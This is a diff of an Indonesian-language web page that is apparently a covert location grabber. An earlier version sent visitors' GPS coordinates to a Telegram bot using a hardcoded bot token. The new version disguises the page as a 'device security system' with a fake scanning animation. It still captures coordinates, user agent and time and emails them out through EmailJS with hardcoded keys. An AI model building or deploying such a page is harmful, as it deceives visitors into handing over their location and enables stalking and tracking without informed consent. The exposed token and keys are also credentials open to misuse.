@@ -3,28 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pelacak Lokasi</title>
+    <title>Sistem Keamanan Perangkat</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00f2fe;
+            --secondary: #4facfe;
+            --bg: #0b0f1a;
+            --glass: rgba(255, 255, 255, 0.03);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: var(--bg);
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(0, 242, 254, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(79, 172, 254, 0.05) 0%, transparent 50%);
+        }
+
+        .container {
+            position: relative;
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 3rem 2rem;
+            border-radius: 2.5rem;
+            text-align: center;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
+            z-index: 10;
+        }
+
+        .scanner-container {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 2.5rem;
+            position: relative;
+        }
+
+        .scanner {
+            width: 100%;
+            height: 100%;
+            border: 2px solid var(--primary);
+            border-radius: 50%;
+            position: relative;
+            animation: pulse 2s infinite ease-in-out;
+        }
+
+        .line {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary));
+            transform-origin: left;
+            animation: rotate 3s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.5; box-shadow: 0 0 0 0 rgba(0, 242, 254, 0.4); }
+            50% { transform: scale(1.05); opacity: 1; box-shadow: 0 0 40px rgba(0, 242, 254, 0.2); }
+            100% { transform: scale(0.95); opacity: 0.5; box-shadow: 0 0 0 0 rgba(0, 242, 254, 0); }
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #fff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 1rem;
+            line-height: 1.6;
+            font-weight: 300;
+        }
+
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: 1;
+        }
+        .orb-1 { width: 300px; height: 300px; background: rgba(0, 242, 254, 0.1); top: -100px; left: -100px; }
+        .orb-2 { width: 400px; height: 400px; background: rgba(79, 172, 254, 0.1); bottom: -150px; right: -150px; }
+
+        .status-ready { color: #10b981; font-weight: 600; margin-top: 1rem; }
+    </style>
 </head>
 <body>
-    <h2>Memeriksa lokasi...</h2>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="container">
+        <div id="status-ui">
+            <div class="scanner-container">
+                <div class="scanner">
+                    <div class="line"></div>
+                </div>
+            </div>
+            <h1 id="title">Keamanan Aktif</h1>
+            <p id="msg">Sedang memverifikasi lokasi perangkat...</p>
+        </div>
+        
+        <div id="success-ui" style="display: none;">
+            <div style="font-size: 5rem; margin-bottom: 1rem;">✅</div>
+            <h1>Proteksi Aktif</h1>
+            <p>Data lokasi terenkripsi telah dikirim ke email admin.</p>
+            <div class="status-ready">System Secure</div>
+        </div>
+    </div>
+
     <script>
-        let botToken = "7661576818:AAF30R3thCCw2oxvN0Ssyu98YpsnvcQpeTs"; // Ganti dengan TOKEN BOT
-        let chatId = "5964872690"; // Ganti dengan Chat ID
+        // ==========================================
+        // KONFIGURASI EMAILJS (Dapatkan dari Dashboard)
+        // ==========================================
+        const PUBLIC_KEY = "8T81WqzN70hbZ_jNd";
+        const SERVICE_ID = "service_rc3g3c7";
+        const TEMPLATE_ID = "template_kd6i4e5";
 
-        navigator.geolocation.getCurrentPosition(position => {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
-            let message = `📍 Lokasi HP:\nLat: ${latitude}\nLng: ${longitude}\n\n🔗 Lihat di Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+        emailjs.init(PUBLIC_KEY);
 
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        const titleEl = document.getElementById('title');
+        const msgEl = document.getElementById('msg');
+        const statusUI = document.getElementById('status-ui');
+        const successUI = document.getElementById('success-ui');
 
-            fetch(url).then(() => {
-                document.body.innerHTML = "<h2>Lokasi berhasil dikirim ke Telegram!</h2>";
-            }).catch(error => {
-                document.body.innerHTML = "<h2>Gagal mengirim lokasi!</h2>";
-                console.error("Error:", error);
+        function sendEmailJS(lat, lng) {
+            const templateParams = {
+                Latitude: lat,
+                Longitude: lng,
+                Google_Maps: `https://www.google.com/maps?q=${lat},${lng}`,
+                Device: navigator.userAgent,
+                Time: new Date().toLocaleString('id-ID')
+            };
+
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+                .then(() => {
+                    statusUI.style.display = 'none';
+                    successUI.style.display = 'block';
+                }, (error) => {
+                    console.error('FAILED...', error);
+                    titleEl.innerText = "Error Konfigurasi";
+                    msgEl.innerText = "Periksa kembali Public Key, Service ID, atau Template ID Anda.";
+                });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                
+                titleEl.innerText = "Mengirim...";
+                msgEl.innerText = "Menghubungkan ke server EmailJS.";
+                
+                sendEmailJS(lat, lng);
+
+            }, (error) => {
+                titleEl.innerText = "Akses Ditolak";
+                msgEl.innerText = "Gagal mendapatkan lokasi. Izinkan akses GPS.";
             });
-        });
+        }
     </script>
 </body>
 </html>
